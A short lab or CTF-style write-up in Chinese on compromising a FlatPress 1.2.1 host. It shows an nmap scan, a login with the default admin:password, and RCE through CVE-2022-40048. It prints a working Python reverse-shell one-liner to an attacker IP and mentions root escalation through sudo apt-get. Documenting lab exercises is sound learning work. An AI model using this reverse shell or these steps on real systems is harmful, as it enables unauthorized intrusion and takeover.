## 偵查

```shell
# Nmap 7.95 scan initiated Tue Sep  9 09:22:41 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80,8089 -4 -sC -sV -o scan_result.txt 192.168.121.29
Nmap scan report for 192.168.121.29
Host is up, received reset ttl 61 (0.088s latency).
Scanned at 2025-09-09 09:22:41 EDT for 16s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNEbgprJqVJa8R95Wkbo3cemB4fdRzos+v750LtPEnRs+IJQn5jcg5l89Tx4junU+AXzLflrMVo55gbuKeNTDtFRU9ltlIu4AU+f7lRlUlvAHlNjUbU/z3WBZ5ZU9j7Xc9WKjh1Ov7chC0UnDdyr5EGrIwlLzgk8zrWx364+S4JqLtER2/n0rhVxa9RCw0tR/oL24kMep4q7rFK6dThiRtQ9nsJFhh6yw8Fmdg7r4uohqH70UJurVwVNwFqtr/86e4VSSoITlMQPZrZFVvoSsjyL8LEODt1qznoLWudMD95Eo1YFSPID5VcS0kSElfYigjSr+9bNSdlzAof1mU6xJA67BggGNu6qITWWIJySXcropehnDAt2nv4zaKAUKc/T0ij9wkIBskuXfN88cEmZbu+gObKbLgwQSRQJIpQ+B/mA8CD4AiaTmEwGSWz1dVPp5Fgb6YVy6E4oO9ASuD9Q1JWuRmnn8uiHF/nPLs2LC2+rh3nPLXlV+MG/zUfQCrdrE=
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCUhhvrIBs53SApXKZYHWBlpH50KO3POt8Y+WvTvHZ5YgRagAEU5eSnGkrnziCUvDWNShFhLHI7kQv+mx+4R6Wk=
|   256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4MSEXnpONsc0ANUT6rFQPWsoVmRW4hrpSRq++xySM9
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
|_http-title: Lugx Gaming Shop HTML5 Template
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.56 (Debian)
8089/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
|_http-generator: FlatPress fp-1.2.1
|_http-favicon: Unknown favicon MD5: 315957B26C1BD8805590E36985990754
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: FlatPress
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  9 09:22:57 2025 -- 1 IP address (1 host up) scanned in 15.89 seconds
```

## 列舉 & 提權

先看看 8089 port 
發現是 FlatPress 架設的平台，應該有 exploit  
先放著，嘗試登入看看，結果帳號密碼是 admin:password  
然後有掃出來是 Flatpress 1.2.1 版本  
這個版本有已知的漏洞(CVE-2022-40048)，可以利用來取得 RCE   
取得 RCE 後可以 Rev shell 回來
```python
export RHOST="192.168.45.214";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

之後就準備提權，首先看看 `sudo -l`
發現可以透過 `apt-get` 提權，之後查查 GTFOBins 就有 root shell 了